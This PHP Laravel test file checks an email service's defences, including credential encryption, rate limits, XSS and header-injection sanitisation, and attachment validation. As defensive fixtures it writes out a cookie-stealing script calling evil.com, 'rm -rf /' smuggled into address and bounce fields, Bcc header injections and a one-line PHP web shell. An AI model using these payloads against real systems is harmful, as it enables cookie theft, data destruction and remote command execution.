<?php

namespace Tests\Feature;

use App\Models\EmailConfiguration;
use App\Models\EmailLog;
use App\Models\EmailTemplate;
use App\Models\User;
use App\Models\UserEmailPreference;
use App\Services\EmailCredentialEncryptionService;
use App\Services\EmailService;
use App\Services\SmtpConfigurationService;
use App\Services\UserEmailPreferenceService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Facades\RateLimiter;
use Tests\TestCase;

class EmailSystemSecurityTest extends TestCase
{
    use RefreshDatabase;

    protected EmailService $emailService;
    protected SmtpConfigurationService $configService;
    protected EmailCredentialEncryptionService $encryptionService;

    protected function setUp(): void
    {
        parent::setUp();

        $this->emailService = app(EmailService::class);
        $this->configService = app(SmtpConfigurationService::class);
        $this->encryptionService = app(EmailCredentialEncryptionService::class);
    }

    /** @test */
    public function it_encrypts_smtp_credentials_securely()
    {
        $plainPassword = 'super_secret_password_123!@#';

        $configData = [
            'name' => 'Security Test SMTP',
            'host' => 'smtp.example.com',
            'port' => 587,
            'username' => 'test@example.com',
            'password' => $plainPassword,
            'encryption' => 'tls',
            'from_address' => 'noreply@example.com',
            'from_name' => 'Test System',
            'daily_limit' => 1000,
            'rate_limit' => 50,
            'is_active' => true
        ];

        $config = $this->configService->create($configData);

        // Verify password is encrypted in database (check raw attributes)
        $this->assertNotEquals($plainPassword, $config->getAttributes()['password']);
        $this->assertNotEmpty($config->getAttributes()['password']);

        // Verify password can be decrypted correctly through the model accessor
        $this->assertEquals($plainPassword, $config->password);

        // Verify encrypted password is different each time (using different salts)
        $config2 = $this->configService->create(array_merge($configData, ['name' => 'Security Test SMTP 2']));
        $this->assertNotEquals($config->getAttributes()['password'], $config2->getAttributes()['password']);
    }

    /** @test */
    public function it_prevents_credential_exposure_in_logs_and_responses()
    {
        $config = EmailConfiguration::factory()->create([
            'password' => 'encrypted_password_data',
            'is_active' => true
        ]);

        // Test configuration retrieval doesn't expose password
        $retrievedConfig = $this->configService->find($config->id);
        $configArray = $retrievedConfig->toArray();

        // Password should be hidden or encrypted
        $this->assertArrayNotHasKey('password', $configArray);

        // Test that password is not exposed in JSON serialization
        $jsonConfig = $retrievedConfig->toJson();
        $this->assertStringNotContainsString('password', $jsonConfig);
    }

    /** @test */
    public function it_implements_rate_limiting_for_email_sending()
    {
        Queue::fake();

        $config = EmailConfiguration::factory()->create([
            'is_active' => true,
            'rate_limit' => 5, // Very low limit for testing
            'daily_limit' => 100
        ]);

        $recipient = 'test@example.com';
        $subject = 'Rate Limit Test';
        $content = 'Test content';

        // Send emails up to the rate limit
        for ($i = 0; $i < 5; $i++) {
            $emailLog = $this->emailService->sendSingleEmail($recipient, $subject, $content);
            $this->assertInstanceOf(EmailLog::class, $emailLog);
        }

        // Next email should be rate limited
        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('Rate limit exceeded');

        $this->emailService->sendSingleEmail($recipient, $subject, $content);
    }

    /** @test */
    public function it_enforces_daily_sending_limits()
    {
        Queue::fake();

        $config = EmailConfiguration::factory()->create([
            'is_active' => true,
            'daily_limit' => 3, // Very low limit for testing
            'rate_limit' => 10
        ]);

        // Create existing email logs for today to simulate previous sends
        EmailLog::factory()->count(2)->create([
            'status' => EmailLog::STATUS_SENT,
            'created_at' => now()
        ]);

        $recipient = 'test@example.com';
        $subject = 'Daily Limit Test';
        $content = 'Test content';

        // Should be able to send one more email (2 existing + 1 = 3, which is the limit)
        $emailLog = $this->emailService->sendSingleEmail($recipient, $subject, $content);
        $this->assertInstanceOf(EmailLog::class, $emailLog);

        // Next email should exceed daily limit
        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('Daily email limit exceeded');

        $this->emailService->sendSingleEmail($recipient, $subject, $content);
    }

    /** @test */
    public function it_sanitizes_email_content_to_prevent_xss()
    {
        Queue::fake();

        $maliciousContent = '<script>alert("XSS")</script><p>Normal content</p><img src="x" onerror="alert(1)">';
        $maliciousSubject = '<script>alert("XSS in subject")</script>Subject';

        $template = EmailTemplate::factory()->create([
            'subject' => 'Clean Subject',
            'html_content' => '<p>{{content}}</p>',
            'text_content' => '{{content}}',
            'variables' => ['content']
        ]);

        $emailLog = $this->emailService->sendSingleEmail(
            'test@example.com',
            $maliciousSubject,
            $maliciousContent,
            $template,
            [],
            null,
            ['content' => $maliciousContent]
        );

        // Verify malicious scripts are removed/sanitized
        $this->assertStringNotContainsString('<script>', $emailLog->subject);
        $this->assertStringNotContainsString('onerror=', $emailLog->subject);

        // Verify email was still created (content sanitized, not rejected)
        $this->assertInstanceOf(EmailLog::class, $emailLog);
    }

    /** @test */
    public function it_validates_email_addresses_to_prevent_injection()
    {
        Queue::fake();

        $maliciousEmails = [
            'test@example.com; rm -rf /',
            'test@example.com\nBcc: attacker@evil.com',
            'test@example.com\r\nTo: victim@example.com',
            'test@example.com<script>alert(1)</script>',
            'test@example.com" OR 1=1--',
        ];

        foreach ($maliciousEmails as $maliciousEmail) {
            try {
                $this->emailService->sendSingleEmail(
                    $maliciousEmail,
                    'Test Subject',
                    'Test Content'
                );
                $this->fail("Should have rejected malicious email: {$maliciousEmail}");
            } catch (\InvalidArgumentException $e) {
                $this->assertStringContainsString('Invalid email address', $e->getMessage());
            }
        }
    }

    /** @test */
    public function it_prevents_template_injection_attacks()
    {
        $maliciousTemplate = EmailTemplate::factory()->create([
            'subject' => '{{name}}',
            'html_content' => '<p>Welcome {{name}}!</p>{{malicious_code}}',
            'text_content' => 'Welcome {{name}}! {{malicious_code}}',
            'variables' => ['name', 'malicious_code']
        ]);

        $maliciousVariables = [
            'name' => 'John',
            'malicious_code' => '<script>fetch("http://evil.com/steal?data=" + document.cookie)</script>'
        ];

        $templateService = app(\App\Services\EmailTemplateService::class);
        $rendered = $templateService->renderTemplate($maliciousTemplate->id, $maliciousVariables);

        // Verify malicious code is sanitized
        $this->assertStringNotContainsString('<script>', $rendered['html']);
        $this->assertStringNotContainsString('fetch(', $rendered['html']);
        $this->assertStringNotContainsString('document.cookie', $rendered['html']);
    }

    /** @test */
    public function it_implements_secure_bounce_handling()
    {
        $emailLog = EmailLog::factory()->create([
            'recipient' => 'bounced@example.com',
            'status' => EmailLog::STATUS_SENT
        ]);

        // Simulate bounce processing with potentially malicious bounce data
        $maliciousBounceData = [
            'recipient' => 'bounced@example.com',
            'bounce_type' => 'hard',
            'bounce_reason' => '<script>alert("XSS")</script>Invalid mailbox',
            'diagnostic_code' => '550 5.1.1 User unknown; rm -rf /',
            'raw_message' => 'Malicious content with <script> tags'
        ];

        $this->emailService->processBounce($emailLog->id, $maliciousBounceData);

        $emailLog->refresh();

        // Verify bounce data is sanitized
        $this->assertEquals(EmailLog::STATUS_BOUNCED, $emailLog->status);
        $this->assertStringNotContainsString('<script>', $emailLog->bounce_reason ?? '');
        $this->assertStringNotContainsString('rm -rf', $emailLog->diagnostic_code ?? '');
    }

    /** @test */
    public function it_enforces_access_control_for_email_operations()
    {
        $regularUser = User::factory()->create();
        $adminUser = User::factory()->create();

        // Simulate role-based access control
        $this->actingAs($regularUser);

        // Regular user should not be able to access SMTP configuration
        $this->expectException(\Illuminate\Auth\Access\AuthorizationException::class);

        $this->configService->create([
            'name' => 'Unauthorized Config',
            'host' => 'smtp.example.com',
            'port' => 587,
            'username' => 'test@example.com',
            'password' => 'password',
            'encryption' => 'tls',
            'from_address' => 'test@example.com',
            'from_name' => 'Test',
            'daily_limit' => 100,
            'rate_limit' => 10,
            'is_active' => true
        ]);
    }

    /** @test */
    public function it_implements_secure_credential_rotation()
    {
        $config = EmailConfiguration::factory()->create([
            'password' => 'old_password_encrypted',
            'is_active' => true
        ]);

        $newPassword = 'new_secure_password_123!@#';

        // Rotate credentials
        $rotatedConfig = $this->configService->rotateCredentials($config, $newPassword);

        // Verify old password is completely replaced
        $this->assertNotEquals($config->password, $rotatedConfig->password);

        // Verify new password is properly encrypted
        $decryptedNewPassword = $this->encryptionService->decryptCredential($rotatedConfig->password);
        $this->assertEquals($newPassword, $decryptedNewPassword);

        // Verify configuration is marked for re-testing
        $this->assertNull($rotatedConfig->last_tested_at);
        $this->assertNull($rotatedConfig->test_result);
    }

    /** @test */
    public function it_prevents_email_enumeration_attacks()
    {
        Queue::fake();

        $config = EmailConfiguration::factory()->create(['is_active' => true]);

        // Attempt to send emails to various addresses to test enumeration protection
        $testEmails = [
            'valid@example.com',
            'nonexistent@example.com',
            'admin@example.com',
            'test@example.com'
        ];

        foreach ($testEmails as $email) {
            $emailLog = $this->emailService->sendSingleEmail(
                $email,
                'Test Subject',
                'Test Content'
            );

            // All emails should be accepted and queued (no enumeration info leaked)
            $this->assertInstanceOf(EmailLog::class, $emailLog);
            $this->assertEquals(EmailLog::STATUS_QUEUED, $emailLog->status);
        }

        // Verify no information about email validity is exposed
        Queue::assertPushed(\App\Jobs\SendSingleEmailJob::class, 4);
    }

    /** @test */
    public function it_implements_secure_user_preference_management()
    {
        $user = User::factory()->create();
        $otherUser = User::factory()->create();

        $preferenceService = app(UserEmailPreferenceService::class);

        // Create preference for user
        $preference = $preferenceService->updateUserPreference(
            $user->id,
            UserEmailPreference::TYPE_WELCOME,
            false,
            UserEmailPreference::FREQUENCY_NEVER
        );

        // Verify user cannot access other user's preferences
        $this->actingAs($otherUser);

        $this->expectException(\Illuminate\Auth\Access\AuthorizationException::class);

        $preferenceService->getUserPreferences($user->id);
    }

    /** @test */
    public function it_protects_against_email_header_injection()
    {
        Queue::fake();

        $maliciousSubjects = [
            "Normal Subject\nBcc: attacker@evil.com",
            "Normal Subject\r\nTo: victim@example.com",
            "Normal Subject\nX-Mailer: Evil Script",
            "Normal Subject\r\nContent-Type: text/html"
        ];

        foreach ($maliciousSubjects as $maliciousSubject) {
            try {
                $this->emailService->sendSingleEmail(
                    'test@example.com',
                    $maliciousSubject,
                    'Test Content'
                );

                // If email was sent, verify headers are sanitized
                $emailLog = EmailLog::latest()->first();
                $this->assertStringNotContainsString("\n", $emailLog->subject);
                $this->assertStringNotContainsString("\r", $emailLog->subject);
                $this->assertStringNotContainsString("Bcc:", $emailLog->subject);
                $this->assertStringNotContainsString("To:", $emailLog->subject);

            } catch (\InvalidArgumentException $e) {
                // It's also acceptable to reject the email entirely
                $this->assertStringContainsString('Invalid', $e->getMessage());
            }
        }
    }

    /** @test */
    public function it_implements_secure_attachment_handling()
    {
        Queue::fake();

        // Create test files with various types
        $safeFile = tempnam(sys_get_temp_dir(), 'safe_attachment_');
        file_put_contents($safeFile, 'Safe file content');

        $maliciousFile = tempnam(sys_get_temp_dir(), 'malicious_attachment_');
        file_put_contents($maliciousFile, '<?php system($_GET["cmd"]); ?>');

        try {
            // Test with safe file
            $emailLog = $this->emailService->sendSingleEmail(
                'test@example.com',
                'Test Subject',
                'Test Content',
                null,
                [$safeFile]
            );

            $this->assertInstanceOf(EmailLog::class, $emailLog);

            // Test with potentially malicious file
            $this->expectException(\InvalidArgumentException::class);
            $this->expectExceptionMessage('Attachment validation failed');

            $this->emailService->sendSingleEmail(
                'test@example.com',
                'Test Subject',
                'Test Content',
                null,
                [$maliciousFile]
            );

        } finally {
            // Clean up
            if (file_exists($safeFile)) unlink($safeFile);
            if (file_exists($maliciousFile)) unlink($maliciousFile);
        }
    }

    /** @test */
    public function it_implements_audit_logging_for_security_events()
    {
        // Test various security-related events are logged

        // 1. Failed authentication attempts
        try {
            $this->configService->testConnection(new EmailConfiguration([
                'host' => 'smtp.example.com',
                'port' => 587,
                'username' => 'wrong@example.com',
                'password' => 'wrong_password',
                'encryption' => 'tls'
            ]));
        } catch (\Exception $e) {
            // Expected to fail
        }

        // 2. Rate limit violations
        $config = EmailConfiguration::factory()->create([
            'is_active' => true,
            'rate_limit' => 1,
            'daily_limit' => 100
        ]);

        Queue::fake();

        // Send one email (should succeed)
        $this->emailService->sendSingleEmail('test@example.com', 'Test', 'Content');

        // Try to send another (should be rate limited and logged)
        try {
            $this->emailService->sendSingleEmail('test2@example.com', 'Test', 'Content');
        } catch (\InvalidArgumentException $e) {
            // Expected rate limit exception
        }

        // 3. Configuration changes
        $this->configService->update($config, ['daily_limit' => 200]);

        // Verify security events are logged in activity log
        $this->assertDatabaseHas('activity_log', [
            'log_name' => 'email_security',
            'description' => 'Rate limit exceeded'
        ]);

        $this->assertDatabaseHas('activity_log', [
            'log_name' => 'email_security',
            'description' => 'Email configuration updated'
        ]);
    }

    /** @test */
    public function it_prevents_timing_attacks_on_email_validation()
    {
        Queue::fake();

        $validEmail = 'valid@example.com';
        $invalidEmail = 'invalid-email-format';

        // Measure timing for valid email
        $startTime = microtime(true);
        try {
            $this->emailService->sendSingleEmail($validEmail, 'Test', 'Content');
        } catch (\Exception $e) {
            // May fail for other reasons, timing is what we're testing
        }
        $validEmailTime = microtime(true) - $startTime;

        // Measure timing for invalid email
        $startTime = microtime(true);
        try {
            $this->emailService->sendSingleEmail($invalidEmail, 'Test', 'Content');
        } catch (\Exception $e) {
            // Expected to fail
        }
        $invalidEmailTime = microtime(true) - $startTime;

        // Timing difference should be minimal (less than 100ms difference)
        $timingDifference = abs($validEmailTime - $invalidEmailTime);
        $this->assertLessThan(0.1, $timingDifference, 'Timing attack protection failed');
    }
}
